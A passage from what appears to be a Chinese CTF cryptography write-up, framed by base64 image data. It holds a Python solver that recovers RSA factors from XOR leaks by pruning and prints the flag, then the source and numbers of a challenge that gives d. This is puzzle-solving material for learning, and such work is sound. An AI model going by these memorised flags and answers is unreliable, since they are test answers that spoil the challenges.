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AgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaAEyh+j2UTwCCCCAAAJiBMgcYlpFoQgggAACCIgWIHOIbh/FI4AAAgggIEaAzCGmVRSKAAIIIICAaIH/A2Xjo/+4zQaLAAAAAElFTkSuQmCC" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2024/6/27 10:08</span><br><span class="line"># @Author  : 3tefanie</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_pq(bin_p, bin_q):</span><br><span class="line">    l = len(bin_p)</span><br><span class="line">    if l == 512:</span><br><span class="line">        p = int(bin_p, 2)</span><br><span class="line">        if n % p == 0:</span><br><span class="line">            q = n//p</span><br><span class="line">            phi = (p-1)*(q-1)</span><br><span class="line">            d = gmpy2.invert(e,phi)</span><br><span class="line">            m = pow(c,d,n)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            print(flag)</span><br><span class="line">    else:</span><br><span class="line">        p = int(bin_p, 2)</span><br><span class="line">        q = int(bin_q, 2)</span><br><span class="line">        if (p ^ q) % (2 ** l) == p_xor_q % (2 ** l) and p * q % (2 ** l) == n % (2 ** l):</span><br><span class="line">            find_pq(&#x27;1&#x27; + bin_p, &#x27;1&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;1&#x27; + bin_p, &#x27;0&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;0&#x27; + bin_p, &#x27;1&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;0&#x27; + bin_p, &#x27;0&#x27; + bin_q)</span><br><span class="line"></span><br><span class="line">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span><br><span class="line">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span><br><span class="line">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span><br><span class="line">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span><br><span class="line">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span><br><span class="line">p_xor_q = leak1^leak2</span><br><span class="line">find_pq(&#x27;1&#x27;, &#x27;1&#x27;)</span><br><span class="line">```</span><br><span class="line">flag:</span><br><span class="line">```python</span><br><span class="line">cftshow&#123;do_you_know_what_is_xor_and_prune!!!&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h3 id="4-给你d又怎样"><a href="#4-给你d又怎样" class="headerlink" title="4 给你d又怎样"></a><strong>4 给你d又怎样</strong></h3><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">flag=&quot;ctfshow&#123;***&#125;&quot;</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=65537</span><br><span class="line">p=getPrime(128)</span><br><span class="line">q=getPrime(128)</span><br><span class="line">n=p*q</span><br><span class="line">phin=(p-1)*(q-1)</span><br><span class="line">d=invert(e,phin)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print(&quot;c=&quot;,c)</span><br><span class="line">print(&quot;hint=&quot;,pow(n,e,c))</span><br><span class="line">print(&quot;e=&quot;,e)</span><br><span class="line">print(&quot;d=&quot;,d)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span><br><span class="line">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span><br><span class="line">e= 65537</span><br><span class="line">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAw8AAADbCAIAAACk+TolAAAgAElEQVR4Ae29B3xUVfr/P5n0Sgok9N57bypKUxERFLH33nv5rsquu/L/r67rWte1r4sFRQUEQelVOoL0DqGEkoT03n7v5MLlOjMZktAmmc/svuK555x7znPed8j55Hmee69PSUmJTR8REAEREAEREAEREIFyCNjLqVe1CIiACIiACIiACIhAKQG/KmAoKCiowlk6RQREQAREQATOLAF/f/8zO6BGEwGXBCrhW8rLyysuLnY5iipFQAREQARE4LwQYGNiezovU2tS7yHgo7wl77nYWqkIiIAIiIAIiEAVCFTCt1SF0XWKCIiACIiACIiACFR3AqdWS/JwVvdrLPtFQAREwEsIaMPykgt97pd5arWkHLpzf1U0owiIgAiIQBUI+PlV5dalKkykU7yNgPKWvO2Ka70iIAIiIAIiIAKVI3AK3xIPC9DzAipHVL1FQAREQATOEwHtWecJfM2f9hRqqeYD0ApFQAREQAREQAREwC0BqSW3eNQoAiIgAiIgAiLg9QSklrz+KyAAIiACIiACIiACbglILbnFo0YREAEREAEREAGvJyC15PVfAQEQAREQAREQARFwS0BqyS0eNYqACIiACIiACHg9Aaklr/8KCIAIiIAIiIAIiIBbAlJLbvGoUQREQAREQAREwOsJSC15/VdAAERABERABERABNwSkFpyi0eNIiACIiACIiACXk9AasnrvwICIAIiIAIiIAIi4JaA1JJbPGoUAREQAREQARHwegJSS17/FRAAERABERABERABtwSkltziUaMIiIAIiIAIiIDXE5Ba8vqvgACIgAiIgAiIgAi4JSC15BaPGkVABERABERABLyegNSS138FBEAEREAEREAERMAtAaklt3jUKAIiIAIiIAIi4PUEpJa8/isgACIgAiIgAiIgAm4JSC25xaNGERABERABERABrycgteT1XwEBEAEREAEREAERcEtAasktHjWKgAiIgAiIgAh4PQGpJa//CgiACIiACIiACIiAWwJSS27xqFEEREAEREAERMDrCUgtef1XQABEQAREQAREQATcEpBacotHjSIgAiIgAiIgAl5PQGrJ678CAiACIiACIiACIuCWgNSSWzxqFAEREAEREAER8HoCUkte/xUQABEQAREQAREQAbcEpJbc4lGjCIiACIiACIiA1xOQWvL6r4AAiIAIiIAIiIAIuCUgteQWjxpFQAREQAREQAS8noDUktd/BQRABERABERABETALQGpJbd41CgCIiACIiACIuD1BKSWvP4rIAAiIAIiIAIiIAJuCUgtucWjRhEQAREQAREQAa8nILXk9V8BARABERABERABEXBLQGrJLR41ioAIiEAlCWzatCk1NbWSJ6m7CIiARxOQWvLoyyPjREAEqh2BhQsXJicnVzuzZbAIiIAbAn5u2tQkAiIgAp5PIC8vb/fu3cXFxa1bt87MzIyPjw8MDGzWrFlQUNAZND43N/fo0aNJSUmRkZGNGzf28yv3l2dhYWFF5s3OzsbUgoKCRo0a+fj4hIWFuRmzIgOqjwiIwNkjUO4/+LM3pUYWAREQgTNFoKSk5LfffltX9rnggguQIFFRUdu2bevSpcvIkSMdZkHHZGRkOFRaD0NCQlBa1hqjfOTIkQkTJiBoWrVqtXz58kGDBrVt29a5W8VrCNWNHz+e6e